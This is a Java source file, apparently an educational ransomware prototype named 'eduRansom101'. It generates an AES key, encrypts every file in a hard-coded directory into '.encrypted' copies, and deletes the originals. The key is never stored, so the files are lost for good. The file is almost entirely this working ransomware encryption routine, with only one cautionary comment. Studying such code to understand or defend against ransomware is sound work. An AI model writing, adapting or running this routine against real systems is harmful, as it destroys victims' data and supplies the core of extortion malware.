import javax.crypto.*;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

public class EncryptAES {
    public static void main(String[] args) throws NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, IOException {

        //generation of secret key, choose the right algorithm
        SecretKey secretKey = KeyGenerator.getInstance("AES").generateKey();

        //Algorithm for encryption is declared here
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");


        // Pass the directory with files you want to encrypt, don't use important directories!
        String path = "/Users/christian/IdeaProjects/eduRansom101/ressources";

        //Loops through files and encrypts them
        loopFilesInDir(path, secretKey, cipher);


    }

    public static void loopFilesInDir(String path, SecretKey sk, Cipher ci) throws InvalidKeyException, IOException {
        File dir = new File(path);
        File[] directoryListing = dir.listFiles();
        if (directoryListing != null) {
            for (File child : directoryListing) {
                System.out.println("I'm a file");
                encryptFile(child, ci, sk);
            }
        } else {
            // Handle the case where dir is not really a directory.
            // Checking dir.isDirectory() above would not be sufficient
            // to avoid race conditions with another process that deletes
            // directories.
        }
    }

    public static void encryptFile(File inputFile, Cipher cipher, SecretKey secretKey) throws IOException, InvalidKeyException {
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);

        // initialization vector adds randomness to the encryption
        byte[] iv = cipher.getIV();

        File outputFile = new File(inputFile.getAbsolutePath() + ".encrypted");

        try (FileInputStream fileIn = new FileInputStream(inputFile);
             FileOutputStream fileOut = new FileOutputStream(outputFile);
             CipherOutputStream cipherOut = new CipherOutputStream(fileOut, cipher)) {
            fileOut.write(iv);

            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = fileIn.read(buffer)) != -1) {
                cipherOut.write(buffer, 0, bytesRead);
            }

            cipherOut.flush();
        }

        if (inputFile.delete()) {
            System.out.println("Input file deleted.");
        } else {
            System.out.println("Failed to delete input file.");
        }
    }


}
